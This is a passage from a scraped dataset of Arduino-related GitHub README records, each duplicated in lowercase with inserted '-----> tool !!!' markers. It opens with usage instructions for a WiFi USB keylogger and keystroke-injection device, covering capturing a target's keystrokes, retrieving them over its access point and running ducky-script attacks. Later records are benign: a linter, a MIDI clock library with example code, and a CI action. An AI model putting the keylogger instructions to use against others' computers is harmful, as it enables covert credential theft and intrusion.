about five seconds, any keys presses on the keyboard will be logged by the keylogger and passed through to the target computer.\nKey Presses\nKey presses are stored in the file system of the ESP8266 which can be accessed over WiFi via the device web interface. To access the web interface follow these steps. This is assuming the keylogger is powered on and you are within range of its WiFi access point.\nConnect to the Masterkey WiFi access point using the default password masterkey\nNavigate to http://192.168.4.1 in your web browser\nLogged key presses will be displayed within the text box on that page. At the bottom of the page is a clear button. This button will clear the keylog in the event the user wants to start a fresh log for any reason.\nKeystroke Injection\nKeystroke injection attacks can me executed by navigating to the Live Execute tab at the top of the screen. There you can write, run, and save keystroke injection scripts written in ducky script.\nIf you want to run a script you have written and saved previously, you can navigate to the Scripts tab and select any script from the list of scripts displayed on the screen. You can either click on the script directly to edit, rename, or run the script or you can just click the run button to immediately run the script.\nYou can also upload prewritten scripts to be executed on Masterkey.\nAdmin Settings\nThese settings are responsible for securing the wireless access point of Masterkey and tailoring the appearance to your liking. These settings can be found by navigating to the Settings tab. Ther you will be able to adjust the following settings:\nAccess Point SSID: The name of the access point that will appear when searching through WiFi networks\nAccess Point Password: The password that will be required when connecting to the Masterkey access point\nChannel: The channel the access point will be broadcasted on\nHidden: Boolean which will tell Masterkey whether or not to broadcast its access point\nOnce the settings have been changed, you will be required to hit save and restart for the changes to take effect.\nUpdating Firmware\nAs new firmware is released for the Masterkey, it will be left to the discretion of the user whether or not they would like to update their device. There are two phases to updating Masterkey described here. You may be required to update either the ATMEGA32U4 or the ESP8266. It is more likely the ESP8266 will be updated since most of the functionality resides there including the user interface.\nBootloader\nIf you know what you're doing, you will know how to use this.\navrdude -c usbasp -p m32u4 -b 115200 -v -e -U lfuse:w:0xFF:m -U hfuse:w:0xD8:m -U efuse:w:0xCB:m -U lock:w:0x2F:m -U flash:w:Caterina-A-Star.hex\nUpdating ATMEGA32U4\nTo update the ATMEGA32U4, you will be required to clone this repository, build the project, and upload it directly to the microcontroller using the Arduino IDE. These steps will be explained here.\nto-do\nUpdating ESP8266\nUpdating the ESP8266 occurs over the air using ElegantOTA.\nDownload the latest release\nConnect to the Masterkey access point\nAccess the web page via web browser at http://192.168.4.1\nNavigate to the About tab\nClick on the Update button\nSelect the bin file you downloaded from releases and click Upload\nThe ESP8266 will automatically restart once the update has been applied and you will be required to reconnect to it if you wish to continue to use Masterkey.", "link": "https://github.com/justcallmekoko/USBKeylogger", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "masterkey - usb wifi keylogger\na wifi enabled usb keylogger and keystroke injection -----> tool !!! \ncatch my live stream on twitch where i play games, have just chatting sessions to talk tech, and just generally be an ordinary person who can't figure out how to make proper life decisions.\nstream schedule:\nmon: 1800 - 2000 est\nwed: 1800 - 2000 est\nsun: 1200 - 1400 est\ntable of contentiousness\nabout\nusage\nkey presses\nkeystroke injection\nadmin settings\nupdating firmware\nbootloader\nupdating atmega32u4\nupdating esp8266\nabout\nthe usb wifi keylogger is a hardware hacking tool which is capable of sniffing key presses sent from a usb keyboard to a computer and presenting them to the attacker over wifi. the keylogger runs a modified version of @spacehuhn's wifi keylogger code with a few more tricks and features. for more information about max3421ee based usb keyloggers, visit my hardware keyloggers repo.\nusage\nthe masterkey usb wifi keylogger is intended to be a plug and play device. simply plug the target usb keyboard into the female usb port of the keylogger then plug the usb keylogger into the target computer. after about five seconds, any keys presses on the keyboard will be logged by the keylogger and passed through to the target computer.\nkey presses\nkey presses are stored in the file system of the esp8266 which can be accessed over wifi via the device web interface. to access the web interface follow these steps. this is assuming the keylogger is powered on and you are within range of its wifi access point.\nconnect to the masterkey wifi access point using the default password masterkey\nnavigate to http://192.168.4.1 in your web browser\nlogged key presses will be displayed within the text box on that page. at the bottom of the page is a clear button. this button will clear the keylog in the event the user wants to start a fresh log for any reason.\nkeystroke injection\nkeystroke injection attacks can me executed by navigating to the live execute tab at the top of the screen. there you can write, run, and save keystroke injection scripts written in ducky script.\nif you want to run a script you have written and saved previously, you can navigate to the scripts tab and select any script from the list of scripts displayed on the screen. you can either click on the script directly to edit, rename, or run the script or you can just click the run button to immediately run the script.\nyou can also upload prewritten scripts to be executed on masterkey.\nadmin settings\nthese settings are responsible for securing the wireless access point of masterkey and tailoring the appearance to your liking. these settings can be found by navigating to the settings tab. ther you will be able to adjust the following settings:\naccess point ssid: the name of the access point that will appear when searching through wifi networks\naccess point password: the password that will be required when connecting to the masterkey access point\nchannel: the channel the access point will be broadcasted on\nhidden: boolean which will tell masterkey whether or not to broadcast its access point\nonce the settings have been changed, you will be required to hit save and restart for the changes to take effect.\nupdating firmware\nas new firmware is released for the masterkey, it will be left to the discretion of the user whether or not they would like to update their device. there are two phases to updating masterkey described here. you may be required to update either the atmega32u4 or the esp8266. it is more likely the esp8266 will be updated since most of the functionality resides there including the user interface.\nbootloader\nif you know what you're doing, you will know how to use this.\navrdude -c usbasp -p m32u4 -b 115200 -v -e -u lfuse:w:0xff:m -u hfuse:w:0xd8:m -u efuse:w:0xcb:m -u lock:w:0x2f:m -u flash:w:caterina-a-star.hex\nupdating atmega32u4\nto update the atmega32u4, you will be required to clone this repository, build the project, and upload it directly to the microcontroller using the arduino ide. these steps will be explained here.\nto-do\nupdating esp8266\nupdating the esp8266 occurs over the air using elegantota.\ndownload the latest release\nconnect to the masterkey access point\naccess the web page via web browser at http://192.168.4.1\nnavigate to the about tab\nclick on the update button\nselect the bin file you downloaded from releases and click upload\nthe esp8266 will automatically restart once the update has been applied and you will be required to reconnect to it if you wish to continue to use masterkey.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000637, "year": null}, {"Unnamed: 0": 2698, "autor": 658, "date": null, "content": "Arduino Lint\nArduino Lint is a command line tool that checks for common problems in Arduino projects:\nSketches\nLibraries\nBoards platforms\nDocumentation\nFor usage instructions, see the documentation\nContinuous Integration\nThere is a GitHub Actions action that makes it easy to use Arduino Lint` in your CI workflows!\nSee https://github.com/arduino/arduino-lint-action for more information.\nHow to contribute\nContributions are welcome!\nPlease see the How to contribute page for information on building the source code, running tests, and contributing your changes to the project.\nBeta testing\nNightly builds are available for beta testing.\nSecurity\nIf you think you found a vulnerability or other security-related bug in this project, please read our security policy and report the bug to our Security Team \ud83d\udee1\ufe0f Thank you!\ne-mail contact: security@arduino.cc", "link": "https://github.com/arduino/arduino-lint", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "arduino lint\narduino lint is a command line -----> tool !!!  that checks for common problems in arduino projects:\nsketches\nlibraries\nboards platforms\ndocumentation\nfor usage instructions, see the documentation\ncontinuous integration\nthere is a github actions action that makes it easy to use arduino lint` in your ci workflows!\nsee https://github.com/arduino/arduino-lint-action for more information.\nhow to contribute\ncontributions are welcome!\nplease see the how to contribute page for information on building the source code, running tests, and contributing your changes to the project.\nbeta testing\nnightly builds are available for beta testing.\nsecurity\nif you think you found a vulnerability or other security-related bug in this project, please read our security policy and report the bug to our security team \ud83d\udee1\ufe0f thank you!\ne-mail contact: security@arduino.cc", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000658, "year": null}, {"Unnamed: 0": 2706, "autor": 666, "date": null, "content": "uClock\nBPM clock generator for Arduino and Teensy is a library to implement BPM clock tick calls using hardware interruption for tight and solid timming clock ticks. Tested on ATmega168/328, ATmega16u4/32u4, ATmega2560 and Teensy LC.\nGenerate your self tight BPM clock for music, audio/video productions, performances or instalations. You can clock your MIDI setup or sync different protocols as you wish.\nInterface\nClock library interfaces via attached callback function running on a hardware interrupt and is able to process the following resolutions:\n16PPQN 16 Pulses Per Quarter Note\n32PPQN 32 Pulses Per Quarter Note\n96PPQN 96 Pulses Per Quarter Note\nTo generate a MIDI sync signal to sync external MIDI devices for example, you need to work with the resolution of 96PPQN to follow the standards of MIDI protocol that handles the clock based on 24PPQN.\nFor a simple old felling step sequencer a 16PPQN resolution is a good way to start coding your own step sequencer.\nYou can also use all the 3 resolutions at the same time for whatever reason you think you should.\nExamples\nHere a few examples on the usage of Clock library for MIDI devices, keep in mind the need to make your own MIDI interface, more details will be avaliable soon but until that, you can find good material over the net about the subject.\nIf you dont want to build a MIDI interface and you are going to use your arduino only with your PC, you can use a Serial-to-Midi bridge and connects your arduino via USB cable to your conputer to use it as a MIDI tool like this one.\nA Simple MIDI Sync Box sketch example\nHere is a example on how to create a simple MIDI Sync Box on Arduino boards\n#include <uClock.h>\n// MIDI clock, start and stop byte definitions - based on MIDI 1.0 Standards.\n#define MIDI_CLOCK 0xF8\n#define MIDI_START 0xFA\n#define MIDI_STOP 0xFC\n// The callback function wich will be called by Clock each Pulse of 96PPQN clock resolution.\nvoid ClockOut96PPQN(uint32_t * tick) {\n// Send MIDI_CLOCK to external gears\nSerial.write(MIDI_CLOCK);\n}\n// The callback function wich will be called when clock starts by using Clock.start() method.\nvoid onClockStart() {\nSerial.write(MIDI_START);\n}\n// The callback function wich will be called when clock stops by using Clock.stop() method.\nvoid onClockStop() {\nSerial.write(MIDI_STOP);\n}\nvoid setup() {\n// Initialize serial communication at 31250 bits per second, the default MIDI serial speed communication:\nSerial.begin(31250);\n// Inits the clock\nuClock.init();\n// Set the callback function for the clock output to send MIDI Sync message.\nuClock.setClock96PPQNOutput(ClockOut96PPQN);\n// Set the callback function for MIDI Start and Stop messages.\nuClock.setOnClockStartOutput(onClockStart);\nuClock.setOnClockStopOutput(onClockStop);\n// Set the clock BPM to 126 BPM\nuClock.setTempo(126);\n// Starts the clock, tick-tac-tick-tac...\nuClock.start();\n}\n// Do it whatever to interface with Clock.stop(), Clock.start(), Clock.setTempo() and integrate your environment...\nvoid loop() {\n}\nA example on how to create a simple MIDI Sync Box on Teensy boards and USB Midi setup. Select \"MIDI\" from the Tools->USB Type menu for Teensy to becomes a USB MIDI first.\n#include <uClock.h>\n// The callback function wich will be called by Clock each Pulse of 96PPQN clock resolution.\nvoid ClockOut96PPQN(uint32_t * tick) {\n// Send MIDI_CLOCK to external gears\nusbMIDI.sendRealTime(usbMIDI.Clock);\n}\n// The callback function wich will be called when clock starts by using Clock.start() method.\nvoid onClockStart() {\nusbMIDI.sendRealTime(usbMIDI.Start);\n}\n// The callback function wich will be called when clock stops by using Clock.stop() method.\nvoid onClockStop() {\nusbMIDI.sendRealTime(usbMIDI.Stop);\n}\nvoid setup() {\n// drift for USB Teensy\nuClock.setDrift(1);\n// Inits the clock\nuClock.init();\n// Set the callback function for the clock output to send MIDI Sync message.\nuClock.setClock96PPQNOutput(ClockOut96PPQN);\n// Set the callback function for MIDI Start and Stop messages.\nuClock.setOnClockStartOutput(onClockStart);\nuClock.setOnClockStopOutput(onClockStop);\n// Set the clock BPM to 126 BPM\nuClock.setTempo(126);\n// Starts the clock, tick-tac-tick-tac...\nuClock.start();\n}\n// Do it whatever to interface with Clock.stop(), Clock.start(), Clock.setTempo() and integrate your environment...\nvoid loop() {\n}\nAcid Step Sequencer\nA clone of Roland TB303 step sequencer main engine, here is a example with no user interface for interaction. If you're looking for a user interactable TB303 sequencer engine clone with user interface please take a look here https://github.com/midilab/uClock/tree/master/examples/AcidStepSequencer.\n// Roland TB303 Step Sequencer engine clone.\n// No interface here, just the engine as example.\n// author: midilab contact@midilab.co\n// Under MIT license\n#include \"Arduino.h\"\n#include <uClock.h>\n// Sequencer config\n#define STEP_MAX_SIZE 16\n#define NOTE_LENGTH 4 // min: 1 max: 5 DO NOT EDIT BEYOND!!!\n#define NOTE_VELOCITY 90\n#define ACCENT_VELOCITY 127\n// MIDI config\n#define MIDI_CHANNEL 0 // 0 = channel 1\n// do not edit below!\n#define NOTE_STACK_SIZE 3\n// MIDI clock, start, stop, note on and note off byte definitions - based on MIDI 1.0 Standards.\n#define MIDI_CLOCK 0xF8\n#define MIDI_START 0xFA\n#define MIDI_STOP 0xFC\n#define NOTE_ON 0x90\n#define NOTE_OFF 0x80\n// Sequencer data\ntypedef struct\n{\nuint8_t note;\nbool accent;\nbool glide;\nbool rest;\n} SEQUENCER_STEP_DATA;\ntypedef struct\n{\nuint8_t note;\nint8_t length;\n} STACK_NOTE_DATA;\n// main sequencer data\nSEQUENCER_STEP_DATA _sequencer[STEP_MAX_SIZE];\nSTACK_NOTE_DATA _note_stack[NOTE_STACK_SIZE];\nuint16_t _step_length = STEP_MAX_SIZE;\n// make sure all above sequencer data are modified atomicly only\n// eg. ATOMIC(_sequencer[0].accent = true); ATOMIC(_step_length = 7);\nuint8_t _tmpSREG;\n#define ATOMIC(X) _tmpSREG = SREG; cli(); X; SREG = _tmpSREG;\n// shared data to be used for user interface feedback\nbool _playing = false;\nuint16_t _step = 0;\nvoid sendMidiMessage(uint8_t command, uint8_t byte1, uint8_t byte2)\n{\n// send midi message\ncommand = command | (uint8_t)MIDI_CHANNEL;\nSerial.write(command);\nSerial.write(byte1);\nSerial.write(byte2);\n}\n// The callback function wich will be called by uClock each Pulse of 16PPQN clock resolution. Each call represents exactly one step.\nvoid ClockOut16PPQN(uint32_t * tick)\n{\nuint16_t step;\nuint16_t length = NOTE_LENGTH;\n// get actual step.\n_step = *tick % _step_length;\n// send note on only if this step are not in rest mode\nif ( _sequencer[_step].rest == false ) {\n// check for glide event ahead of _step\nstep = _step;\nfor ( uint16_t i = 1; i < _step_length; i++ ) {\n++step;\nstep = step % _step_length;\nif ( _sequencer[step].glide == true && _sequencer[step].rest == false ) {\nlength = NOTE_LENGTH + (i * 6);\nbreak;\n} else if ( _sequencer[step].rest == false ) {\nbreak;\n}\n}\n// find a free note stack to fit in\nfor ( uint8_t i = 0; i < NOTE_STACK_SIZE; i++ ) {\nif ( _note_stack[i].length == -1 ) {\n_note_stack[i].note = _sequencer[_step].note;\n_note_stack[i].length = length;\n// send note on\nsendMidiMessage(NOTE_ON, _sequencer[_step].note, _sequencer[_step].accent ? ACCENT_VELOCITY : NOTE_VELOCITY);\nreturn;\n}\n}\n}\n}\n// The callback function wich will be called by uClock each Pulse of 96PPQN clock resolution.\nvoid ClockOut96PPQN(uint32_t * tick)\n{\n// Send MIDI_CLOCK to external hardware\nSerial.write(MIDI_CLOCK);\n// handle note on stack\nfor ( uint8_t i = 0; i < NOTE_STACK_SIZE; i++ ) {\nif ( _note_stack[i].length != -1 ) {\n--_note_stack[i].length;\nif ( _note_stack[i].length == 0 ) {\nsendMidiMessage(NOTE_OFF, _note_stack[i].note, 0);\n_note_stack[i].length = -1;\n}\n}\n}\n}\n// The callback function wich will be called when clock starts by using Clock.start() method.\nvoid onClockStart()\n{\nSerial.write(MIDI_START);\n_playing = true;\n}\n// The callback function wich will be called when clock stops by using Clock.stop() method.\nvoid onClockStop()\n{\nSerial.write(MIDI_STOP);\n// send all note off on sequencer stop\nfor ( uint8_t i = 0; i < NOTE_STACK_SIZE; i++ ) {\nsendMidiMessage(NOTE_OFF, _note_stack[i].note, 0);\n_note_stack[i].length = -1;\n}\n_playing = false;\n}\nvoid setup()\n{\n// Initialize serial communication\n// the default MIDI serial speed communication at 31250 bits per second\nSerial.begin(31250);\n// Inits the clock\nuClock.init();\n// Set the callback function for the clock output to send MIDI Sync message.\nuClock.setClock96PPQNOutput(ClockOut96PPQN);\n// Set the callback function for the step sequencer on 16ppqn\nuClock.setClock16PPQNOutput(ClockOut16PPQN);\n// Set the callback function for MIDI Start and Stop messages.\nuClock.setOnClockStartOutput(onClockStart);\nuClock.setOnClockStopOutput(onClockStop);\n// Set the clock BPM to 126 BPM\nuClock.setTempo(126);\n// initing sequencer data\nfor ( uint16_t i = 0; i < STEP_MAX_SIZE; i++ ) {\n_sequencer[i].note = 48;\n_sequencer[i].accent = false;\n_sequencer[i].glide = false;\n_sequencer[i].rest = false;\n}\n// initing note stack data\nfor ( uint8_t i = 0; i < NOTE_STACK_SIZE; i++ ) {\n_note_stack[i].note = 0;\n_note_stack[i].length = -1;\n}\n// pins, buttons, leds and pots config\n//configureYourUserInterface();\n// start sequencer\nuClock.start();\n}\n// User interaction goes here\nvoid loop()\n{\n// Controls your 303 engine interacting with user here...\n// you can change data by using _sequencer[] and _step_length only! do not mess with _note_stack[]!\n// IMPORTANT!!! Sequencer main data are used inside a interrupt enabled by uClock for BPM clock timing. Make sure all sequencer data are modified atomicly using this macro ATOMIC();\n// eg. ATOMIC(_sequencer[0].accent = true); ATOMIC(_step_length = 7);\n//processYourButtons();\n//processYourLeds();\n//processYourPots();\n}\nTroubleshooting\nIf you slave host are not showing correct of close bpm on sync, please try to use the drift variable to adjust. It normaly goes from value 4(good for clock over USB) to 11(good for common MIDI interfaces running at 31250 speed). The default value is 11.\nTo use MIDI via USB on Leonardo boards please start setting the drift to 4:\nuClock.setDrift(4);\nFor teensy boards and USB Midi try:\nuClock.setDrift(1);\nPlease use uClock.setDrift() before uClock.init();", "link": "https://github.com/midilab/uClock", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "uclock\nbpm clock generator for arduino and teensy is a library to implement bpm clock tick calls using hardware interruption for tight and solid timming clock ticks. tested on atmega168/328, atmega16u4/32u4, atmega2560 and teensy lc.\ngenerate your self tight bpm clock for music, audio/video productions, performances or instalations. you can clock your midi setup or sync different protocols as you wish.\ninterface\nclock library interfaces via attached callback function running on a hardware interrupt and is able to process the following resolutions:\n16ppqn 16 pulses per quarter note\n32ppqn 32 pulses per quarter note\n96ppqn 96 pulses per quarter note\nto generate a midi sync signal to sync external midi devices for example, you need to work with the resolution of 96ppqn to follow the standards of midi protocol that handles the clock based on 24ppqn.\nfor a simple old felling step sequencer a 16ppqn resolution is a good way to start coding your own step sequencer.\nyou can also use all the 3 resolutions at the same time for whatever reason you think you should.\nexamples\nhere a few examples on the usage of clock library for midi devices, keep in mind the need to make your own midi interface, more details will be avaliable soon but until that, you can find good material over the net about the subject.\nif you dont want to build a midi interface and you are going to use your arduino only with your pc, you can use a serial-to-midi bridge and connects your arduino via usb cable to your conputer to use it as a midi -----> tool !!!  like this one.\na simple midi sync box sketch example\nhere is a example on how to create a simple midi sync box on arduino boards\n#include <uclock.h>\n// midi clock, start and stop byte definitions - based on midi 1.0 standards.\n#define midi_clock 0xf8\n#define midi_start 0xfa\n#define midi_stop 0xfc\n// the callback function wich will be called by clock each pulse of 96ppqn clock resolution.\nvoid clockout96ppqn(uint32_t * tick) {\n// send midi_clock to external gears\nserial.write(midi_clock);\n}\n// the callback function wich will be called when clock starts by using clock.start() method.\nvoid onclockstart() {\nserial.write(midi_start);\n}\n// the callback function wich will be called when clock stops by using clock.stop() method.\nvoid onclockstop() {\nserial.write(midi_stop);\n}\nvoid setup() {\n// initialize serial communication at 31250 bits per second, the default midi serial speed communication:\nserial.begin(31250);\n// inits the clock\nuclock.init();\n// set the callback function for the clock output to send midi sync message.\nuclock.setclock96ppqnoutput(clockout96ppqn);\n// set the callback function for midi start and stop messages.\nuclock.setonclockstartoutput(onclockstart);\nuclock.setonclockstopoutput(onclockstop);\n// set the clock bpm to 126 bpm\nuclock.settempo(126);\n// starts the clock, tick-tac-tick-tac...\nuclock.start();\n}\n// do it whatever to interface with clock.stop(), clock.start(), clock.settempo() and integrate your environment...\nvoid loop() {\n}\na example on how to create a simple midi sync box on teensy boards and usb midi setup. select \"midi\" from the tools->usb type menu for teensy to becomes a usb midi first.\n#include <uclock.h>\n// the callback function wich will be called by clock each pulse of 96ppqn clock resolution.\nvoid clockout96ppqn(uint32_t * tick) {\n// send midi_clock to external gears\nusbmidi.sendrealtime(usbmidi.clock);\n}\n// the callback function wich will be called when clock starts by using clock.start() method.\nvoid onclockstart() {\nusbmidi.sendrealtime(usbmidi.start);\n}\n// the callback function wich will be called when clock stops by using clock.stop() method.\nvoid onclockstop() {\nusbmidi.sendrealtime(usbmidi.stop);\n}\nvoid setup() {\n// drift for usb teensy\nuclock.setdrift(1);\n// inits the clock\nuclock.init();\n// set the callback function for the clock output to send midi sync message.\nuclock.setclock96ppqnoutput(clockout96ppqn);\n// set the callback function for midi start and stop messages.\nuclock.setonclockstartoutput(onclockstart);\nuclock.setonclockstopoutput(onclockstop);\n// set the clock bpm to 126 bpm\nuclock.settempo(126);\n// starts the clock, tick-tac-tick-tac...\nuclock.start();\n}\n// do it whatever to interface with clock.stop(), clock.start(), clock.settempo() and integrate your environment...\nvoid loop() {\n}\nacid step sequencer\na clone of roland tb303 step sequencer main engine, here is a example with no user interface for interaction. if you're looking for a user interactable tb303 sequencer engine clone with user interface please take a look here https://github.com/midilab/uclock/tree/master/examples/acidstepsequencer.\n// roland tb303 step sequencer engine clone.\n// no interface here, just the engine as example.\n// author: midilab contact@midilab.co\n// under mit license\n#include \"arduino.h\"\n#include <uclock.h>\n// sequencer config\n#define step_max_size 16\n#define note_length 4 // min: 1 max: 5 do not edit beyond!!!\n#define note_velocity 90\n#define accent_velocity 127\n// midi config\n#define midi_channel 0 // 0 = channel 1\n// do not edit below!\n#define note_stack_size 3\n// midi clock, start, stop, note on and note off byte definitions - based on midi 1.0 standards.\n#define midi_clock 0xf8\n#define midi_start 0xfa\n#define midi_stop 0xfc\n#define note_on 0x90\n#define note_off 0x80\n// sequencer data\ntypedef struct\n{\nuint8_t note;\nbool accent;\nbool glide;\nbool rest;\n} sequencer_step_data;\ntypedef struct\n{\nuint8_t note;\nint8_t length;\n} stack_note_data;\n// main sequencer data\nsequencer_step_data _sequencer[step_max_size];\nstack_note_data _note_stack[note_stack_size];\nuint16_t _step_length = step_max_size;\n// make sure all above sequencer data are modified atomicly only\n// eg. atomic(_sequencer[0].accent = true); atomic(_step_length = 7);\nuint8_t _tmpsreg;\n#define atomic(x) _tmpsreg = sreg; cli(); x; sreg = _tmpsreg;\n// shared data to be used for user interface feedback\nbool _playing = false;\nuint16_t _step = 0;\nvoid sendmidimessage(uint8_t command, uint8_t byte1, uint8_t byte2)\n{\n// send midi message\ncommand = command | (uint8_t)midi_channel;\nserial.write(command);\nserial.write(byte1);\nserial.write(byte2);\n}\n// the callback function wich will be called by uclock each pulse of 16ppqn clock resolution. each call represents exactly one step.\nvoid clockout16ppqn(uint32_t * tick)\n{\nuint16_t step;\nuint16_t length = note_length;\n// get actual step.\n_step = *tick % _step_length;\n// send note on only if this step are not in rest mode\nif ( _sequencer[_step].rest == false ) {\n// check for glide event ahead of _step\nstep = _step;\nfor ( uint16_t i = 1; i < _step_length; i++ ) {\n++step;\nstep = step % _step_length;\nif ( _sequencer[step].glide == true && _sequencer[step].rest == false ) {\nlength = note_length + (i * 6);\nbreak;\n} else if ( _sequencer[step].rest == false ) {\nbreak;\n}\n}\n// find a free note stack to fit in\nfor ( uint8_t i = 0; i < note_stack_size; i++ ) {\nif ( _note_stack[i].length == -1 ) {\n_note_stack[i].note = _sequencer[_step].note;\n_note_stack[i].length = length;\n// send note on\nsendmidimessage(note_on, _sequencer[_step].note, _sequencer[_step].accent ? accent_velocity : note_velocity);\nreturn;\n}\n}\n}\n}\n// the callback function wich will be called by uclock each pulse of 96ppqn clock resolution.\nvoid clockout96ppqn(uint32_t * tick)\n{\n// send midi_clock to external hardware\nserial.write(midi_clock);\n// handle note on stack\nfor ( uint8_t i = 0; i < note_stack_size; i++ ) {\nif ( _note_stack[i].length != -1 ) {\n--_note_stack[i].length;\nif ( _note_stack[i].length == 0 ) {\nsendmidimessage(note_off, _note_stack[i].note, 0);\n_note_stack[i].length = -1;\n}\n}\n}\n}\n// the callback function wich will be called when clock starts by using clock.start() method.\nvoid onclockstart()\n{\nserial.write(midi_start);\n_playing = true;\n}\n// the callback function wich will be called when clock stops by using clock.stop() method.\nvoid onclockstop()\n{\nserial.write(midi_stop);\n// send all note off on sequencer stop\nfor ( uint8_t i = 0; i < note_stack_size; i++ ) {\nsendmidimessage(note_off, _note_stack[i].note, 0);\n_note_stack[i].length = -1;\n}\n_playing = false;\n}\nvoid setup()\n{\n// initialize serial communication\n// the default midi serial speed communication at 31250 bits per second\nserial.begin(31250);\n// inits the clock\nuclock.init();\n// set the callback function for the clock output to send midi sync message.\nuclock.setclock96ppqnoutput(clockout96ppqn);\n// set the callback function for the step sequencer on 16ppqn\nuclock.setclock16ppqnoutput(clockout16ppqn);\n// set the callback function for midi start and stop messages.\nuclock.setonclockstartoutput(onclockstart);\nuclock.setonclockstopoutput(onclockstop);\n// set the clock bpm to 126 bpm\nuclock.settempo(126);\n// initing sequencer data\nfor ( uint16_t i = 0; i < step_max_size; i++ ) {\n_sequencer[i].note = 48;\n_sequencer[i].accent = false;\n_sequencer[i].glide = false;\n_sequencer[i].rest = false;\n}\n// initing note stack data\nfor ( uint8_t i = 0; i < note_stack_size; i++ ) {\n_note_stack[i].note = 0;\n_note_stack[i].length = -1;\n}\n// pins, buttons, leds and pots config\n//configureyouruserinterface();\n// start sequencer\nuclock.start();\n}\n// user interaction goes here\nvoid loop()\n{\n// controls your 303 engine interacting with user here...\n// you can change data by using _sequencer[] and _step_length only! do not mess with _note_stack[]!\n// important!!! sequencer main data are used inside a interrupt enabled by uclock for bpm clock timing. make sure all sequencer data are modified atomicly using this macro atomic();\n// eg. atomic(_sequencer[0].accent = true); atomic(_step_length = 7);\n//processyourbuttons();\n//processyourleds();\n//processyourpots();\n}\ntroubleshooting\nif you slave host are not showing correct of close bpm on sync, please try to use the drift variable to adjust. it normaly goes from value 4(good for clock over usb) to 11(good for common midi interfaces running at 31250 speed). the default value is 11.\nto use midi via usb on leonardo boards please start setting the drift to 4:\nuclock.setdrift(4);\nfor teensy boards and usb midi try:\nuclock.setdrift(1);\nplease use uclock.setdrift() before uclock.init();", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000666, "year": null}, {"Unnamed: 0": 2729, "autor": 689, "date": null, "content": "setup-arduino-cli\nThis action makes the arduino-cli tool available to Workflows.\nUsage\nTo get the latest stable version of arduino-cli just add this step:\n- name: Install Arduino CLI\nuses: arduino/setup-arduino-cli@v1\nIf you want to pin a major or minor version you can use the .x wildcard:\n- name: Install Arduino CLI\nuses: arduino/setup-arduino-cli@v1\nwith:\nversion: \"0.x\"\nTo pin the exact version:\n- name: Install Arduino CLI\nuses: arduino/setup-arduino-cli@v1\nwith:\nversion: \"0.5.0\"\nExamples\nHere there is a good example on how to use the action. See also the Arduino on GitHub Actions blogpost to learn more.\nDevelopment\nTo work on the codebase you have to install all the dependencies:\n# npm install\nTo run tests set the environment variable GITHUB_TOKEN with a valid Personal Access Token and then:\n# npm run test\nSee the official Github documentation to know more about Personal Access Tokens.\nRelease\nnpm install to add all the dependencies, included development.\nnpm run build to build the Action under the ./lib folder.\nnpm run test to see everything works as expected.\nnpm run pack to package for distribution\ngit add src dist to check in the code that matters.\nIf the release will increment the major version, update the action refs in the examples in README.md (e.g., uses: arduino/setup-arduino-cli@v1 -> uses: arduino/setup-arduino-cli@v2).\nopen a PR and request a review.\nAfter PR is merged, create a release, following the vX.Y.Z tag name convention.\nAfter the release, rebase the release branch for that major version (e.g., v1 branch for the v1.x.x tags) on the tag. If no branch exists for the release's major version, create one.\nSecurity\nIf you think you found a vulnerability or other security-related bug in this project, please read our security policy and report the bug to our Security Team \ud83d\udee1\ufe0f Thank you!\ne-mail contact: security@arduino.cc", "link": "https://github.com/arduino/setup-arduino-cli", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "setup-arduino-cli\nthis action makes the arduino-cli -----> tool !!!  available to workflows.\nusage\nto get the latest stable version of arduino-cli just add this step:\n- name: install arduino cli\nuses: arduino/setup-arduino-cli@v1\nif you want to pin a major or minor version you can use the .x wildcard:\n- name: install arduino cli\nuses: arduino/setup-arduino-cli@v1\nwith:\nversion: \"0.x\"\nto pin the exact version:\n- name: install arduino cli\nuses: arduino/setup-arduino-cli@v1\nwith:\nversion: \"0.5.0\"\nexamples\nhere there is a good example on how to use the action. see also the arduino on github actions blogpost to learn more.\ndevelopment\nto work on the codebase you have to install all the dependencies:\n# npm install\nto run tests set the environment variable github_token with a valid personal access token and then:\n# npm run test\nsee the official github documentation to know more about personal access tokens.\nrelease\nnpm install to add all the dependencies, included development.\nnpm run build to build the action under the ./lib folder.\nnpm run test to see everything works as expected.\nnpm run pack to package for distribution\ngit add src dist to check in the code that matters.\nif the release will increment the major version, update the action refs in the examples in readme.md (e.g., uses: arduino/setup-arduino-cli@v1 -> uses: arduino/setup-arduino-cli@v2).\nopen a pr and request a review.\nafter pr is merged, create a release, following the vx.y.z tag name convention.\nafter the release, rebase the release branch for that major version (e.g., v1 branch for the v1.x.x tags) on the tag. if no branch exists for the release's major version, create one.\nsecurity\nif you think you found a vulnerability or other security-related bug in this project, please read our security policy and report the bug to our security team \ud83d\udee1\ufe0f thank you!\ne-mail contact: security@arduino.cc", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000689, "year": null}, {"Unnamed: 0": 2765, "autor": 725, "date": null, "content": "License\nMIT License\nCopyright (c) 2016 MobiFlight\nPermission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:\nThe above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER 